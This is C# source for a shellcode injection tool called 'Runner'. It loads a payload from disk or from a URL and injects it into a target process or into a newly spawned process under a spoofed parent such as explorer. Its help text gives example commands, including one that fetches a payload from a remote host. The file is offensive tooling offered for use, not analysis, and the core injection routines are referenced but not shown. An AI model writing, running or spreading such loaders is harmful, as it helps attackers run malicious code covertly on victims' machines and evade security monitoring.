using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.IO;
namespace ProcessInjection
{
  class Program
  {


    static void Main(string[] args)
    {
      // init some vars yo
      bool isSelf = false;
      string targ = String.Empty;
      string form = String.Empty;
      string parent = String.Empty;
      string spawn = String.Empty;
      string meth = String.Empty;
      int pid = 0;
      byte[] sc;
      string[] keys = new string[] { "meth", "pid", "parent", "spawn", "targ", "form" };

      if (args.Length > 0) {
        if (args[0].ToLower() == "-h" || args[0].ToLower() == "--help" || args[0].ToLower() == "help") {
          Help();
          return;
        }
      }

      // parsing and normalization
      var parsed = Parser.ParseArgs(args, keys);

      if (!parsed.ContainsKey("meth")) {
        parsed["meth"] = "simple";
        meth = parsed["meth"];
      } else {
        meth = parsed["meth"];
      }

      if (!parsed.ContainsKey("form")) {
        parsed["form"] = "bin";
        form = parsed["form"];
      } else {
        form = parsed["form"];
      }


      if (parsed.ContainsKey("pid") && parsed["pid"].Length > 0) {
        if (parsed.ContainsKey("parent") || parsed.ContainsKey("spawn")) {
          Console.WriteLine("[!] Cannot pass in parent/spawn values with the pid option");
          return;
        }
        parsed["parent"] = String.Empty;
        parsed["spawn"] = String.Empty;
        // pid = parsed["pid"] ; skip def for now
      } else {
        // parent spawn mode
        if (parsed.ContainsKey("pid")) {
          Console.WriteLine("[!] Cannot pass in pid with the parent/spawn option");
          return;
        } else if (!parsed.ContainsKey("parent") || !parsed.ContainsKey("spawn")) {
          Console.WriteLine("[!] Arguments missing either parent or spawn args.");
          return;
        }
        parsed["pid"] = String.Empty;
        parent = parsed["parent"];
        spawn = parsed["spawn"];
      }

      Parser.DebugArgs(parsed, keys);

      // main work
      if (!Parser.ContainsAll(parsed, keys)) {
        Console.WriteLine("Issue with arguments.");
        Help();
        return;
      } else {
        // main work after key check
        if (parent.Length > 0) {
          if (spawn.ToLower() == "browser") {
            spawn = Browser.FindBrowserExePath(spawn);
          } else {
            spawn = Resolver.FullExeInPath(spawn);
          }
          if (spawn.Length < 1 || !File.Exists(spawn)) {
            Console.WriteLine($"[!] Spawn path {spawn} does not exist and could not be found.");
            return;
          }
          int parentPid = Resolver.PID(parent);
          Console.WriteLine($"[>] Parent: {parent}");
          Console.WriteLine($"[>] Parent PID: {parentPid}");
          Console.WriteLine($"[>] Spawn: {spawn}");
          if (parentPid < 1) {
            Console.WriteLine("[!] Unable to resolve parent pid. Sorry. Quitting");
            return;
          }
          form = form.ToLower();
          targ = parsed["targ"];

          sc = Resolver.SC(targ, form);
          if (sc.Length < 1) {
            Console.WriteLine($"[!] Invalid target {targ} or form {form}");
            Console.WriteLine("[!] No target data resolved from disk/over network or invalid form value. Quiting.");
            return;
          }

          Parent par = new Parent();
          Win32.PROCESS_INFORMATION info = par.Init(parentPid, spawn);

          if (meth == "simple") {
            try {
              IntPtr hProcess = Simple.Run(sc, info.dwProcessId, false);
              Win32.CloseHandle(hProcess);
            } catch (Exception e) {
              Console.WriteLine("[!] A bad thing happened. Sorry about that.");
              DumpError(e);
              return;
            }
          } else if (meth == "hal") {
            Console.WriteLine("[>] Hal mode activated");
          } else {
            Console.WriteLine($"Invalid meth option '{meth}'. Valid options are hal, simple, or apc");
            return;
          }


        } else {
          Console.WriteLine("[>] Live mode activated.");
          if (parsed["pid"].ToLower() == "self") {
            isSelf = true;
          }
          pid = Resolver.PID(parsed["pid"]);
          if (pid < 1) {
            string dbgPid = parsed["pid"];
            Console.WriteLine($"[!] Unable to find pid {dbgPid}.");
            return;
          }
          // target pid can be numeric id, 'self', or name or process
          Console.WriteLine($"[>] Target pid: {pid}");

          form = form.ToLower();
          targ = parsed["targ"];
          sc = Resolver.SC(targ, form);
          if (sc.Length < 1) {
            Console.WriteLine($"[!] Invalid target {targ} or form {form}");
            Console.WriteLine("[!] No target data resolved from disk/over network or invalid form value. Quiting.");
            return;
          }

          meth = meth.ToLower();


          if (meth == "simple") {
            try {
              Simple.Run(sc, pid, isSelf);
            } catch (Exception e) {
              Console.WriteLine("[!] A bad thing happened. Sorry about that.");
              DumpError(e);
              return;
            }
          } else if (meth == "hal") {
            Console.WriteLine("[>] Hal mode activated");

          } else {
            Console.WriteLine($"Invalid meth option '{meth}'. Valid options are hal, simple, or apc");
            return;
          }
        }
      }
    }

    public static void DumpError(Exception e)
    {
      Console.Error.WriteLine("[x] Error:");
      Console.Error.WriteLine("    {0}", e.Message);
      Console.Error.WriteLine("    {0}", e.StackTrace);
    }

    public static void Help()
    {
      Console.Error.WriteLine("Runner Help:");
      Console.Error.WriteLine("    Usage: Runner.exe [options]");
      Console.Error.WriteLine("    Example: Runner.exe targ=http://fun/targ.bin form=bin meth=simple pid=1000");
      Console.Error.WriteLine("    Example: Runner.exe targ=C:\\path\\to\\targ.b64 form=b64 meth=simple pid=self");
      Console.Error.WriteLine("    Example: Runner.exe targ=C:\\path\\to\\targ.b64 form=b64 meth=simple pid=explorer");
      Console.Error.WriteLine("    Example: Runner.exe targ=C:\\path\\to\\targ.b64 form=b64 meth=simple parent=1000 spawn=C:\\path\\to\\custom.exe");
      Console.Error.WriteLine("    Example: Runner.exe targ=C:\\path\\to\\targ.b64 form=b64 meth=simple parent=explorer spawn=notepad.exe");
      Console.Error.WriteLine("Defaults:");
      Console.Error.WriteLine("    meth => simple");
      Console.Error.WriteLine("    form => bin");
    }
  }
}